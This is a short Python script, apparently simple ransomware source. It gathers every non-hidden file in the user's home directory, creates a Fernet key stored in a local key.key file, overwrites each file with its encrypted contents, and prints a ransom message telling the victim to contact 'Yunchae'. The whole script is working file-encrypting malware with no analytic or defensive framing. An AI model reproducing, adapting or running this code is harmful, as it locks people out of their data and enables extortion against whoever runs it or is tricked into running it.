#!/usr/bin/env python3

import os

from cryptography.fernet import Fernet, InvalidToken

All_files = []
home = os.path.expanduser("~")
for root, dirs, files in os.walk(home):
    dirs[:] = [d for d in dirs if not d.startswith(".")]

    visible_file = [f for f in files if not f.startswith(".")]

    for thefile in visible_file:
            path = os.path.join(root,thefile)
            
            if path.endswith("encrypting.py") or path.endswith("key.key") or path.endswith("decrypting.py"):
                continue
            All_files.append(path)


print(All_files)

gen_key = Fernet.generate_key()

with open("key.key", "rb") as f:
    key = f.read()

with open("hello.txt", "rb") as f:
    content = f.read()

if key == b'':
    with open("key.key", "wb") as thekey:
        thekey.write(gen_key)
        key = gen_key

try:
    Fernet(key).decrypt(content)
    print("Already Fernet encrypted with this key")
except InvalidToken:
    
    with open("key.key", "wb") as thekey:
        thekey.write(gen_key)

    for file in All_files:
        try:
            with open(file, "rb") as thefile:
                content = thefile.read()
        except:
            continue

        content_encrypted = Fernet(gen_key).encrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)



print("Your data is encrypted!, contact Yunchae!")

